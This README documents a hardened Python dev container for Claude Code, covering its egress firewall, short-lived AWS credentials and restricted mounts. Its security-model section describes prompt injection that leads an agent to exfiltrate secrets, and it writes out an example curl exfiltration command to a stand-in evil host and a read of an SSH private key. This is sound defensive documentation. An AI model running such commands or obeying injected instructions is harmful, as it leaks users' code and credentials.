# Devcontainer Base Image: Hardened Python Environment with Claude Code

This repository contains the shared base Docker image and scripts for hardened Python dev containers. It provides an isolated, firewall-restricted development environment designed for use with Neovim and Claude Code, with strong protections against prompt injection attacks that attempt to exfiltrate credentials or source code.

Individual service repositories inherit from this base image and add only their service-specific configuration. See [Using the Base Image in a Service](#using-the-base-image-in-a-service) for how to set that up.

## Repository Structure

```
devcontainer-base/
├── base-image/
│   ├── Dockerfile
│   └── init-firewall.sh
├── scripts/
│   ├── dev-container-helpers.sh
│   ├── post-start.sh
│   └── print-setup-hint.sh
├── templates/
│   ├── devcontainer.json.example
│   ├── firewall-extras.sh.example
│   └── Dockerfile.example
└── README.md
```

**`base-image/`** — The Dockerfile and firewall script that get built into the shared image. This image includes Python, Neovim, Node.js, Claude Code, firewall tooling, and common Python dev tools (ruff, pyright, pytest, ipython, debugpy).

**`scripts/`** — Helper scripts that are copied into each service's `.devcontainer/` directory. These run on the host (`dev-container-helpers.sh`) or inside the container at startup (`post-start.sh`, `print-setup-hint.sh`).

**`templates/`** — Example files for setting up a new service to use the base image.

---

## Building and Publishing the Base Image

### Prerequisites

- Docker
- AWS CLI (authenticated with push access to the ECR repository)

### Build

```bash
cd base-image
docker build -t your-registry/devcontainer-base:latest .
```

To pin a specific Claude Code version:

```bash
docker build --build-arg CLAUDE_CODE_VERSION=2.1.52 \
  -t your-registry/devcontainer-base:latest .
```

To use a different Python version:

```bash
docker build --build-arg PYTHON_VERSION=3.12 \
  -t your-registry/devcontainer-base:3.12 .
```

### Push to ECR

```bash
# Authenticate Docker with ECR (once per session)
aws ecr get-login-password --region <region> | docker login --username AWS --password-stdin <registry-url>

# Push the image
docker push your-registry/devcontainer-base:latest
```

Tag images with dates or semver so services can pin to a known-good version:

```bash
docker tag your-registry/devcontainer-base:latest your-registry/devcontainer-base:2026-04-06
docker push your-registry/devcontainer-base:2026-04-06
```

### When to Rebuild

Rebuild and push a new base image when:

- Neovim, Node.js, or Claude Code versions need updating
- Python dev tools (ruff, pyright, etc.) need updating
- The firewall script changes (new default domains, logic fixes)
- New system packages are needed across all services

You do NOT need to rebuild the base image when:

- A service's Python dependencies change (handled by `pip install` at container creation)
- A service needs different forwarded ports (configured in `devcontainer.json`)
- Mounts or environment variables change (configured in `devcontainer.json`)

---

## Using the Base Image in a Service

### 1. Create the service's `.devcontainer/` directory

Copy the scripts and templates into your service repo:

```bash
mkdir -p your-service/.devcontainer

# Copy the shared scripts
cp scripts/post-start.sh your-service/.devcontainer/
cp scripts/print-setup-hint.sh your-service/.devcontainer/

# Copy and rename the templates
cp templates/Dockerfile.example your-service/.devcontainer/Dockerfile
cp templates/devcontainer.json.example your-service/.devcontainer/devcontainer.json
```

Edit `devcontainer.json` to set the service name, `postCreateCommand`, and `forwardPorts` for your service.

Edit the `Dockerfile` if your service needs additional system packages. If it doesn't, the one-line `FROM` is all you need.

Your service's `.devcontainer/` should look like this:

```
your-service/
├── .devcontainer/
│   ├── devcontainer.json
│   ├── Dockerfile
│   ├── firewall-extras.sh     # (optional) service-specific whitelisted domains
│   ├── post-start.sh
│   └── print-setup-hint.sh
└── ... your code ...
```

### 2. Set up the host environment (one-time per developer)

Install the helper script:

```bash
cp scripts/dev-container-helpers.sh ~/.local/bin/
echo '[ -f ~/.local/bin/dev-container-helpers.sh ] && source ~/.local/bin/dev-container-helpers.sh' >> ~/.bashrc
source ~/.bashrc
```

Add the required environment variables to `~/.bashrc` or `~/.zshrc`:

```bash
# Full path to your shared notes directory
export NOTES_PATH="/home/yourusername/projects/notes"

# Full path to your EC2 SSH key
export EC2_KEY_PATH="/home/yourusername/path/to/your-ec2-key.pem"

# The EC2 bastion host for database tunneling
export EC2_HOST="ec2-xx-xx-xx-xx.compute-1.amazonaws.com"

# If your IAM user has MFA enabled (recommended)
export AWS_MFA_SERIAL="arn:aws:iam::123456789012:mfa/your-username"
```

Create the shared notes directory if it doesn't exist:

```bash
mkdir -p ~/projects/notes
```

Ensure the Claude config directory exists:

```bash
mkdir -p ~/.claude
```

### 3. Authenticate Docker with the container registry

If the base image is hosted on a private registry (e.g., ECR), authenticate before your first build:

```bash
aws ecr get-login-password --region <region> | docker login --username AWS --password-stdin <registry-url>
```

ECR tokens expire after 12 hours. If `dcup` fails with an image pull error, re-run the login command.

### 4. Build and start

```bash
cd your-service
dcup
```

### 5. Daily workflow

```bash
cd your-service
dcup          # start the container
dcdanger      # launch Claude Code (with AWS creds injected)
dcnvim        # open Neovim (with AWS creds injected)
dcshell       # get a bash shell (with AWS creds injected)
dcrefresh     # manually refresh the STS token if it expires mid-session
```

---

## What's in the Base Image

| Component | Purpose |
|---|---|
| Python 3.13 (slim) | Base runtime |
| Neovim | Editor |
| Node.js 22 | Required by some Neovim tooling |
| Claude Code (native binary) | AI coding assistant |
| ruff, pyright, pytest, ipython, debugpy | Python dev tools |
| iptables, ipset, iproute2, dnsutils, jq | Firewall tooling |
| curl, git, tmux, ripgrep, fd-find, unzip | Core dev utilities |
| `init-firewall.sh` | Egress firewall script (baked in at `/usr/local/bin/`) |
| Non-root `dev` user (UID 1000) | All work runs unprivileged |

---

## AWS Credentials: How It Works

The dev container does NOT mount `~/.aws` from your host. Instead, short-lived STS session tokens are generated on the host and passed into the container as environment variables.

The flow is:

1. You run `dcdanger` (or `dcnvim`, `dcshell`, etc.)
2. The helper script calls `aws sts get-session-token` on your host using your IAM user's long-lived credentials
3. If MFA is enabled, it prompts for your TOTP code
4. STS returns a temporary `AccessKeyId`, `SecretAccessKey`, and `SessionToken`
5. These are passed into the container via `env` on `devcontainer exec`
6. Boto3 picks them up automatically from environment variables

Your long-lived IAM access keys never enter the container. The temporary credentials expire after a configurable duration (default: 4 hours, adjustable via `export DC_TOKEN_DURATION=28800` for 8 hours). Even if a prompt injection reads the environment variables inside the container, the egress firewall blocks any exfiltration attempt, and the credentials expire shortly after.

## EC2 SSH Tunnel: How It Works

Some services create an SSH tunnel to an EC2 bastion host to reach the database. This requires two things inside the container:

1. **The EC2 SSH key**: mounted read-only from the host to `/home/dev/.ssh/ec2-key` inside the container. Only this single key is mounted — not your entire `~/.ssh` directory.
2. **Network access to the EC2 host**: the firewall whitelists `$EC2_HOST` alongside the other allowed domains.

The `EC2_PRIVATE_KEY_PATH` environment variable is set in `devcontainer.json` to point to the mounted key, so no code changes are needed.

---

## Security Model

This dev container is hardened against a specific threat: **prompt injection attacks against agentic coding tools**. The scenario it protects against is as follows. You run Claude Code with `--dangerously-skip-permissions`, which allows it to execute shell commands without confirmation. During a task, Claude Code encounters a malicious prompt (embedded in a web page, package README, issue tracker, or any text it processes). That prompt instructs Claude Code to read sensitive files and exfiltrate them to an attacker-controlled server.

The container defends against this with two independent layers.

### Layer 1: No credentials to steal

The container only mounts what is strictly necessary:

| Mounted (accessible inside container) | Why |
|---|---|
| `~/.config/nvim` | Your Neovim configuration |
| `~/.local/share/nvim` | Neovim plugin and state data |
| `~/.claude` and `~/.claude.json` | Claude Code auth token and config |
| `~/.ssh/<EC2_KEY_NAME>` (read-only) | Single SSH key for database tunnel |
| Your project directory | Mounted as `/workspace` (this is your code) |
| Named volume for pip cache | Speeds up pip installs across rebuilds |

Everything else on your host is invisible to the container:

| NOT mounted (invisible inside container) | What it protects |
|---|---|
| `~/.ssh` (full directory) | All other SSH private keys |
| `~/.aws` | AWS access keys and session tokens |
| `~/.config/gcloud` | Google Cloud credentials |
| `~/.kube` | Kubernetes cluster credentials |
| `~/.gnupg` | GPG private keys |
| `~/.netrc` | Plaintext login credentials |
| `~/.env`, `.env` files | API keys, database passwords |

If a prompt injection runs `cat ~/.ssh/id_ed25519` inside the container, it gets "file not found." The file simply doesn't exist in the container's filesystem.

AWS credentials are passed as environment variables (not mounted files) and are short-lived STS tokens that expire within hours.

### Layer 2: Egress firewall (network lockdown)

Even though credentials aren't mounted, your **source code** is — it has to be, since that's what you're working on. The firewall prevents exfiltration of source code or any other data by restricting outbound network access to a strict whitelist.

The container can ONLY reach:

| Domain | Purpose |
|---|---|
| `api.anthropic.com` | Claude Code API calls |
| `sentry.io` | Claude Code error reporting (optional) |
| `statsig.anthropic.com` | Claude Code telemetry (optional) |
| `statsig.com` | Claude Code telemetry (optional) |
| `registry.npmjs.org` | Node package registry (optional) |
| `github.com` | Claude plugin marketplace (optional) |
| `$EC2_HOST` | SSH tunnel to database |
| AWS service CIDRs (us-east-1) | SSM, S3, EC2, STS API endpoints |
| Docker host network | Port forwarding (OAuth, app ports) |
| localhost | LSP servers, local tools |

All other outbound traffic is blocked and rejected. A prompt injection that tries `curl https://evil.example.com/exfil -d "$(cat /workspace/secrets.py)"` will fail immediately with a connection rejected error.

---

## How the Firewall Works

The firewall script (`init-firewall.sh`) runs every time the container starts via `postStartCommand`. It uses `iptables` and `ipset` to create a default-deny egress policy — all outbound traffic is blocked unless it's going to an explicitly whitelisted destination. Here's what happens step by step.

### Phase 1: Preserve Docker internals

Docker uses an embedded DNS server at `127.0.0.11` for container name resolution. The script saves any existing NAT rules related to this address before flushing all firewall rules, then restores them afterward. Without this, DNS resolution inside the container would break.

### Phase 2: Allow foundational traffic

Before applying any restrictions, the script permits traffic that everything else depends on: outbound DNS (UDP port 53) so domain names can be resolved, localhost/loopback so LSP servers and local tools work, and the Docker host network (auto-detected via the default gateway) so port forwarding works for things like Claude Code's OAuth browser flow and your application ports.

### Phase 3: Resolve and whitelist domains

The script maintains an `ALLOWED_DOMAINS` array of hostnames that the container is permitted to reach. For each domain, it runs `dig` to resolve the current A records and adds the resulting IP addresses to an `ipset` hash called `allowed-domains`. If a domain is already a raw IP address, it's added directly.

This is where the DNS-based limitation comes in: the IPs are resolved once at container start. If a service like `api.anthropic.com` rotates to new IPs during a long session, outbound connections to that service may fail until you restart the container. In practice this is rare for typical dev sessions lasting a few hours.

### Phase 4: Whitelist AWS service CIDRs

AWS services (SSM, S3, EC2, STS) rotate their IP addresses frequently and unpredictably — far more than a typical web service. Resolving `ssm.us-east-1.amazonaws.com` once at startup would break within minutes as AWS shifts traffic across its infrastructure.

To handle this, the script fetches the official AWS IP ranges from `https://ip-ranges.amazonaws.com/ip-ranges.json` (a well-known, stable endpoint maintained by AWS). It then extracts the CIDR blocks for the specific services and region your container needs — currently `SSM`, `S3`, `EC2`, and `AMAZON` in `us-east-1` — and adds all of them to the `ipset` whitelist.

This adds a few hundred CIDRs covering the full range of IPs those AWS services might use in your region. It's broader than the per-domain approach used for other services, but it's still scoped: only the listed services in the listed region are whitelisted, and these are AWS infrastructure endpoints, not arbitrary internet destinations. A prompt injection cannot use `ssm.us-east-1.amazonaws.com` as an exfiltration channel because it requires valid AWS credentials to do anything with those endpoints.

The `AMAZON` service prefix is included because it's a superset that covers shared AWS infrastructure (load balancers, edge nodes) that other services depend on. Without it, some legitimate AWS API calls may fail because the actual IP the request hits isn't tagged under the specific service prefix.

### Phase 5: Lock down and verify

After building the whitelist, the script sets the default `iptables` policies to `DROP` for all chains (INPUT, FORWARD, OUTPUT). It then adds rules to allow established/related connections (so responses to approved outbound requests can come back in) and to allow outbound traffic only to IPs in the `allowed-domains` ipset.

Everything else hits a `REJECT` rule (not `DROP`) with `icmp-admin-prohibited`. The distinction matters: `REJECT` sends an immediate error response back to the calling process, so tools like `curl` fail fast with a clear error. `DROP` would silently swallow packets, causing tools to hang for their full timeout duration before failing — which makes debugging harder and slows down prompt injection attempts that are probing for connectivity.

Finally, the script runs verification checks to confirm that the firewall is working correctly: it confirms that `example.com` and `webhook.site` (common exfiltration test targets) are blocked, that `api.anthropic.com` is reachable, and that the EC2 bastion host (if configured) is reachable on port 22. If any critical check fails, the script exits with a non-zero code, which causes `postStartCommand` to fail and prevents the container from being used in an insecure state.

### Adding domains to the default whitelist

To add domains for all services, edit the `ALLOWED_DOMAINS` array in `base-image/init-firewall.sh`, rebuild, and push the base image.

### Adding domains for a single service

If a service needs to reach additional domains beyond the base whitelist, create a `firewall-extras.sh` file in the service's `.devcontainer/` directory:

```bash
# .devcontainer/firewall-extras.sh
#
# Service-specific domains to add to the firewall whitelist.
# This file is sourced by the base image's init-firewall.sh — it does
# not replace it. Add domains your service needs beyond the base set.
#
# Each domain you add is a potential vector for prompt injection
# content, so add only what you genuinely need.

EXTRA_DOMAINS=(
    "your-atlassian-instance.atlassian.net"
    "bitbucket.org"
    # "pypi.org"
    # "files.pythonhosted.org"
)
```

The base image's firewall script automatically checks for this file at `/workspace/.devcontainer/firewall-extras.sh` and appends any `EXTRA_DOMAINS` to the whitelist. No rebuild of the base image is needed — just restart the container:

```bash
dcup
```

This file is safe to commit to the service repo since it only contains domain names, not firewall logic.

### Fully replacing the firewall script

If you need to change the firewall logic itself (not just add domains), you can place a full copy of `init-firewall.sh` in the service's `.devcontainer/` directory. The `post-start.sh` script checks for a local copy first — if one exists, it replaces the base image's version before running it. If no local copy exists, the base image's version runs as usual.

```bash
# Extract the current firewall script from the running container
dcexec cat /usr/local/bin/init-firewall.sh > .devcontainer/init-firewall.sh

# Edit it — modify the firewall logic as needed
vim .devcontainer/init-firewall.sh

# Restart the container to pick up the changes
dcup
```

To revert to the standard firewall, delete the local copy and restart:

```bash
rm .devcontainer/init-firewall.sh
dcup
```

If the override is temporary or personal, gitignore it:

```bash
echo '.devcontainer/init-firewall.sh' >> .gitignore
```

### Changing the AWS region or services

If your infrastructure is in a different region or you need additional AWS services, edit the variables near the AWS CIDR section of `init-firewall.sh`:

```bash
AWS_REGION="us-east-1"
AWS_SERVICES=("SSM" "S3" "EC2" "AMAZON")
```

Change `AWS_REGION` to match your infrastructure. Add service prefixes to `AWS_SERVICES` if you need access to additional AWS services (the valid prefixes are listed in the [AWS IP ranges documentation](https://docs.aws.amazon.com/general/latest/gr/aws-ip-ranges.html)). Keep `AMAZON` in the list — removing it will break connectivity to shared AWS infrastructure that other services depend on.

---

## What This Does NOT Protect Against

No security setup is perfect. Be aware of these remaining risks:

**Source code modification.** A prompt injection can still modify your code — inserting backdoors, weakening security checks, or introducing subtle bugs. The firewall prevents exfiltration but not tampering. Always review changes before committing (which you do from the host).

**Claude auth token.** The `~/.claude` mount means a prompt injection could read your Claude Code auth token. The blast radius is limited to someone making API calls as you to Anthropic, which is much smaller than SSH or AWS credential theft.

**EC2 SSH key.** The mounted EC2 key is read-only and the firewall limits where SSH connections can go (only `$EC2_HOST`). A prompt injection cannot exfiltrate the key to an external server, but it could theoretically use it to SSH into the bastion host.

**Short-lived AWS credentials in environment.** A prompt injection could read the STS token from environment variables. However, the egress firewall blocks exfiltration, and the token expires within hours. This is a significant improvement over mounting long-lived `~/.aws` credentials.

**Container escape.** This setup assumes Docker's container isolation holds. Container escapes are rare but not impossible. The `NET_ADMIN` and `NET_RAW` capabilities required for the firewall are additional kernel capabilities granted to the container, though they are used here to restrict rather than expand access.

**DNS-based firewall limitations.** The firewall resolves domain names to IP addresses at container start time. If a whitelisted service (like `api.anthropic.com`) rotates its IPs during a long session, connections may break until the container is restarted. In practice this rarely matters for typical dev sessions. AWS services are handled differently using CIDR ranges (see Phase 4 above), so they are not affected by this limitation.

**No internet research.** Because the firewall blocks general internet access, Claude Code cannot browse documentation, search the web, or fetch resources from arbitrary URLs. It operates using only its training knowledge and the contents of your project. If you need Claude to reference external information, look it up on your host and paste the relevant content into your prompt.

---

## The `--cap-add` Flags Explained

The `devcontainer.json` includes `--cap-add=NET_ADMIN` and `--cap-add=NET_RAW`. These Docker capabilities allow the container to configure its own network — specifically, to run `iptables` and `ipset`. Without them, the firewall script would fail with "permission denied."

This might seem counterintuitive: you're granting extra capabilities to make the container *more* restrictive. The key distinction is that these capabilities allow the container to restrict its own outbound traffic. They do not grant the container any additional access to the host system or host network.

## The Sudoers Configuration Explained

The Dockerfile grants the non-root `dev` user passwordless sudo access to exactly one command: `/usr/local/bin/init-firewall.sh`. This is configured via:

```
dev ALL=(root) NOPASSWD: /usr/local/bin/init-firewall.sh
```

This means the `dev` user cannot run arbitrary commands as root — only the firewall initialization script. The firewall must run as root because `iptables` requires it, but all other operations (Claude Code, Neovim, Python, your code) run as the unprivileged `dev` user.

---

## Helper Commands Reference

These commands are available after sourcing `dev-container-helpers.sh`:

| Command | Description |
|---|---|
| `dcup` | Start the dev container (optionally pass a workspace path) |
| `dcdanger` | Launch Claude Code with `--dangerously-skip-permissions` and AWS creds |
| `dcnvim` | Open Neovim with AWS creds injected |
| `dcshell` | Get a bash shell with AWS creds injected |
| `dcrefresh` | Force-refresh the cached STS token |
| `dcexec <cmd>` | Run any command inside the container with AWS creds |

### Configuration variables

Set these on your host before sourcing the helpers:

| Variable | Required | Description |
|---|---|---|
| `NOTES_PATH` | Yes | Full path to your shared notes directory |
| `EC2_KEY_PATH` | Yes | Full path to your EC2 SSH key file |
| `EC2_HOST` | Yes | EC2 bastion hostname or IP |
| `AWS_MFA_SERIAL` | No | Your IAM MFA device ARN (prompted for TOTP if set) |
| `DC_TOKEN_DURATION` | No | STS token lifetime in seconds (default: 14400 = 4 hours) |
| `DC_WORKSPACE` | No | Default workspace folder (default: current directory) |
| `AWS_DEFAULT_REGION` | No | AWS region (default: us-east-1) |

---

## Stopping and Restarting

```bash
# Stop the container (preserves state)
docker stop $(docker ps -q --filter "label=devcontainer.local_folder=$(pwd)")

# Start it again (firewall re-initializes automatically)
dcup
```

## Rebuilding After Config Changes

If you modify the service's Dockerfile or devcontainer.json:

```bash
devcontainer up --workspace-folder . --build-no-cache
```

To delete the existing container and rebuild:

```bash
devcontainer up --workspace-folder . --remove-existing-container --build-no-cache
```
